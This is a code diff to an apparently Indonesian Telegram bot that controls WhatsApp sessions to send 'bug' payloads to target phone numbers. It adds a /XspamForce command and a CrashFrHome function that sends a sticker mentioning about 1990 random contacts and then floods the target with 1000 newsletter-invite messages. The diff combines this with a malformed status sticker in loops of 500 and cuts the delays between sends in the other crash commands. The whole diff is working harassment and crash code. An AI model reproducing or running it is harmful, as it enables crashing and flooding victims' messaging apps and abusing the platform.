@@ -26,7 +26,7 @@ const thumbnailUrl = "https://files.catbox.moe/6ogo26.jpg";
 
 // Konfigurasi GitHub Auto Update
 const GITHUB_RAW_URL = "https://raw.githubusercontent.com/sihalohoalexander389-oss/primrose-bot/main/index.js";
-const CURRENT_VERSION = "3.0.24";
+const CURRENT_VERSION = "3.0.25";
 const AUTO_UPDATE_FILE = "./database/auto_update.json";
 const PENDING_UPDATE_FILE = "./database/pending_update.json";
 
@@ -319,7 +319,6 @@ setTimeout(async () => {
     const pending = getPendingUpdate();
     if (pending && pending.chatId) {
         try {
-            // Kirim notifikasi ke owner (bisa juga ke chatId asal)
             const targetChatId = OWNER_ID;
             await bot.sendMessage(targetChatId, `✅ *VERSI SUDAH NEW!*\n\nVersi ${pending.oldVersion} → ${pending.newVersion}\nBot telah berhasil diupdate dan restart.\n\nSilakan gunakan bot kembali.\n\n© Primrose Linux Bot`, { parse_mode: "Markdown" });
             clearPendingUpdate();
@@ -1067,7 +1066,7 @@ async function executeTestFunction(sock, target, funcCode, jumlah) {
             } catch (err) {
                 console.error("Error executing function:", err.message);
             }
-            await sleep(200);
+            await sleep(100);
         }
         return true;
     } catch (error) {
@@ -1622,6 +1621,8 @@ bot.on("callback_query", async (query) => {
 <b>╰➤ crash hard</b>
 ─▢ /Ganesha +628
 <b>╰➤ Buldo hard</b>
+─▢ /XspamForce +628
+<b>╰➤ spam force anti kenok (2 function combo)</b>
 <pre>──────────────────────────
    MENU: Pilih Fitur Bug Menu di Atas 
 ──────────────────────────</pre>`
@@ -2179,34 +2180,87 @@ bot.onText(/^add$/i, async (msg) => {
     bot.sendMessage(chatId, `✅ Selamat @${username || userId}! Anda telah mendapatkan akses premium selama ${remainingDays} hari. Silakan gunakan command bug yang tersedia.`, { parse_mode: "HTML" });
 });
 
-// ================= BUG FUNCTIONS (KOSONG) ================= //
-async function brem(sock, target) { }
-async function VisiFriend(sock, target) { }
-async function OfferXForclose(sock, target) { }
-async function bulldozerV2(sock, target) { }
-async function xatanicaldelayv2(sock, target) { }
-async function MbaPe(sock, target) { }
+// ================= BUG FUNCTIONS ================= //
 
-async function StickerFC(sock, target){
-  const message = {
-  "groupStatusMessageV2": {
-    "message": {
-      "stickerMessage": {
-        "url": "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
-        "fileSha256": "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
-        "fileEncSha256": "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
-        "mediaKey": "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
-        "mimetype": "image/webp",
-        "directPath": "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
-        "fileLength": "10610",
-        "mediaKeyTimestamp": "1775044724",
-        "stickerSentTs": "1775044724091"
-      }
-    }
-  }
+// Function CrashFrHome - Anti Kenok, Support Nokos Fresh, Anti Blokir
+async function CrashFrHome(sock, target) {
+  try {
+    const stickerMsg = {
+      viewOnceMessage: {
+        message: {
+          stickerMessage: {
+            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
+            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
+            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
+            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
+            mimetype: "image/webp",
+            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
+            fileLength: { low: 1, high: 0, unsigned: true },
+            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
+            isAnimated: true,
+            contextInfo: {
+              mentionedJid: [
+                target,
+                ...Array.from({ length: 1990 }, () =>
+                  "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net"
+                ),
+              ],
+            },
+          },
+        },
+      },
+    };
+
+    await sock.sendMessage(target, stickerMsg);
+    console.log("✅ CrashFrHome sticker sent to:", target);
+
+    for (let i = 0; i < 1000; i++) {
+      await sock.sendMessage(target, {
+        viewOnceMessage: {
+          message: {
+            eventMessage: {
+              newsletterAdminInviteMessage: {
+                newsletterJid: "33333333333333333@newsletter",
+                newsletterName: "FrezeHomeAbouse",
+              },
+            },
+          },
+        },
+      });
+      console.log(`📤 CrashFrHome sending to ${target} - iteration ${i + 1}`);
+      await sleep(50);
+    }
+  } catch (e) {
+    console.log("❌ Error in CrashFrHome:", e);
+  }
 }
 
-  return await sock.relayMessage(target, message, {})
+// Function StickerFC - Support combo dengan CrashFrHome
+async function StickerFC(sock, target) {
+  try {
+    const message = {
+      "groupStatusMessageV2": {
+        "message": {
+          "stickerMessage": {
+            "url": "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
+            "fileSha256": "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
+            "fileEncSha256": "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
+            "mediaKey": "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
+            "mimetype": "image/webp",
+            "directPath": "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
+            "fileLength": "10610",
+            "mediaKeyTimestamp": "1775044724",
+            "stickerSentTs": "1775044724091"
+          }
+        }
+      }
+    };
+
+    await sock.relayMessage(target, message, {});
+    console.log("✅ StickerFC sent to:", target);
+  } catch (err) {
+    console.error("❌ Error StickerFC:", err);
+  }
 }
 
 async function Zxxcontact(sock, target) {
@@ -2238,11 +2292,18 @@ async function Zxxcontact(sock, target) {
       }
     );
 
-    console.log("✅ Success send:", target);
+    console.log("✅ Zxxcontact sent to:", target);
   } catch (err) {
-    console.error("❌ Error sending:", err);
+    console.error("❌ Error Zxxcontact:", err);
   }
 }
+
+async function brem(sock, target) { }
+async function VisiFriend(sock, target) { }
+async function OfferXForclose(sock, target) { }
+async function bulldozerV2(sock, target) { }
+async function xatanicaldelayv2(sock, target) { }
+async function MbaPe(sock, target) { }
 
 function createBugSuccessMessage(targetNumber, bugType, date) {
     return `
@@ -2291,6 +2352,43 @@ async function checkUserAccess(userId, chatId, chatType, commandName) {
     return true;
 }
 
+// ================= COMMAND /XspamForce ================= //
+bot.onText(/\/XspamForce(?:\s+(\d+))?/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const chatType = msg.chat.type;
+    
+    const hasAccess = await checkUserAccess(userId, chatId, chatType, "xspamforce");
+    if (!hasAccess) return;
+    
+    if (!match[1]) {
+        return bot.sendMessage(chatId, "🪧 *Format:* /XspamForce 628xxx\n\n💡 *Fitur:* Spam Force Anti Kenok\n✅ Support Nokos Fresh\n✅ Anti Blokir\n✅ 2 Function Combo (CrashFrHome + StickerFC)\n✅ Bebas spam tanpa jeda", { parse_mode: "Markdown" });
+    }
+    
+    const targetNumber = match[1].replace(/[^0-9]/g, "");
+    const target = `${targetNumber}@s.whatsapp.net`;
+    const date = getCurrentDate();
+    
+    if (sessions.size === 0) {
+        return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
+    }
+    
+    const sock = sessions.values().next().value;
+    
+    await bot.sendMessage(chatId, createBugSuccessMessage(targetNumber, "XspamForce (Anti Kenok)", date), {
+        parse_mode: "HTML",
+        reply_markup: createCheckButton(targetNumber)
+    });
+    
+    // Spam tanpa jeda - bebas sepuasnya
+    for (let i = 0; i < 500; i++) {
+        await CrashFrHome(sock, target);
+        await StickerFC(sock, target);
+        console.log(`🚀 XspamForce iteration ${i + 1} to ${targetNumber}`);
+        await sleep(100);
+    }
+});
+
 bot.onText(/\/Xploit(?:\s+(\d+))?/, async (msg, match) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
@@ -2316,7 +2414,7 @@ bot.onText(/\/Xploit(?:\s+(\d+))?/, async (msg, match) => {
     
     for (let i = 0; i < 400; i++) {
         await Zxxcontact(sock, target);
-        await sleep(2000);
+        await sleep(100);
     }
 });
 
@@ -2345,7 +2443,7 @@ bot.onText(/\/Sanjiva(?:\s+(\d+))?/, async (msg, match) => {
     
     for (let i = 0; i < 10; i++) {
         await xatanicaldelayv2(sock, target);
-        await sleep(200);
+        await sleep(100);
     }
 });
 
@@ -2374,7 +2472,7 @@ bot.onText(/\/Stova(?:\s+(\d+))?/, async (msg, match) => {
     
     for (let i = 0; i < 7; i++) {
         await brem(sock, target);
-        await sleep(200);
+        await sleep(100);
     }
 });
 
@@ -2403,7 +2501,7 @@ bot.onText(/\/Chatms(?:\s+(\d+))?/, async (msg, match) => {
     
     for (let i = 0; i < 500; i++) {
         await StickerFC(sock, target);
-        await sleep(3000);
+        await sleep(100);
     }
 });
 
@@ -2432,7 +2530,7 @@ bot.onText(/\/Ganesha(?:\s+(\d+))?/, async (msg, match) => {
     
     for (let i = 0; i < 10; i++) {
         await bulldozerV2(sock, target);
-        await sleep(200);
+        await sleep(100);
     }
 });
 
@@ -2461,7 +2559,7 @@ bot.onText(/\/sendbug(?:\s+(\d+))?/, async (msg, match) => {
     
     for (let i = 0; i < 35; i++) {
         await VisiFriend(sock, target);
-        await sleep(200);
+        await sleep(100);
     }
 });
 
